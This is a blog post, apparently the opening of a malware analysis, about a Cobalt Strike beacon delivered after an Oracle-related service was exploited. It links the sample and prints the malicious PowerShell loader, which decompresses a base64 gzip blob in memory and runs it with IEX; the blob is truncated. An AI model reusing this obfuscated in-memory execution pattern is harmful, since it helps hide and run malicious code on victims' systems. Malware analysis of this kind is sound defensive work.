---
title: "Cobalt Strike beacon analysis"
categories:
  - Blog
tags:
  - Malware Analysis
  - Cobalt Strike
---


## Discovery

I recently discovered this malicious PowerShell script from a [Twitter post by @xorJosh](https://twitter.com/xorJosh/status/1655905247334735878). In his tweet he described an Oracle related service was exploited to download and execute a PowerShell script.

[![1](/assets/images/CobaltStrikeBeaconAnalysis1/InitalExecution.webp)](/assets/images/CobaltStrikeBeaconAnalysis1/InitalExecution.webp)

The malware sample mentioned can be found on [MalwareBazaar](https://bazaar.abuse.ch/sample/9c9e8841d706406bc23d05589f77eec6f8df6d5e4076bc6a762fdb423bfe8c24/)

## Static Analysis

```ruby
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAA/+y9Wa/qSrIu+rzrV8yHLa21xNo1wBhjjrSla2wwxh09mDqlkjHgBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9ERqSXp+I/lkXmO4UeH0/f/mNzynI/jr4xf/nLuYycAv/GP/7hnop/JFns/MM+HrNTnn/7X3/5t
....QUA"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
